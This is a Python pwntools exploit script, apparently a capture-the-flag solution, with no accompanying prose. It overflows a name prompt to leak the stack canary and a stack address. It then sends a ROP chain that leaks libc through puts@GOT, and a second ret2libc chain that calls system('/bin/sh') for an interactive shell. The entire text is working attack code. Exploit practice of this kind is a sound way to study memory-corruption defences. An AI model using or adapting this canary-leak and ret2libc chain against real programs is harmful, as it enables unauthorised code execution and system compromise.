libc = ELF("./libc.so.6")

rop = ROP(exe)
POP_RDI = rop.find_gadget(["pop rdi", "ret"]).address
RET =  rop.find_gadget(["ret"]).address

io = start()

# leak stack + canary
io.sendafter(b"name: ", cyclic(0x49))
io.recvline()
io.recvn(0x49)
canary = u64(b"\x00"+io.recvn(7))
stack = u64(io.recvline()[:-1].ljust(8,b"\x00"))
info("Canary leaked: 0x%x, stack 0x%x", canary, stack)
io.send(b"n")

# first ropchain => leak libc
ropchain = b""+p64(0)
ropchain += p64(POP_RDI) + p64(exe.got.puts) + p64(exe.plt.puts) + p64(exe.sym.main)
ropchain += b"\x00"*(0x48-len(ropchain))
payload = ropchain+p64(canary)+p64(stack - 0x70)
io.sendafter(b"again: ", payload)

# Receive data
io.recvuntil(b"Thank you\n")
addr = u64(io.recvline()[:-1].ljust(8, b"\x00")) - libc.sym.puts
info("Libc @ 0x%x", addr)

# ret2libc
libc.address = addr
ropchain = b""+p64(0)
ropchain += p64(POP_RDI) + p64(next(libc.search(b"/bin/sh"))) + p64(RET) + p64(libc.sym.system)
ropchain += b"\x00"*(0x48-len(ropchain))
payload = ropchain+p64(canary)+p64(stack - 0x70 - 0x50)
io.sendafter(b"name: ", payload)
io.send(b"y")
io.recvuntil(b"Thank you")

io.interactive()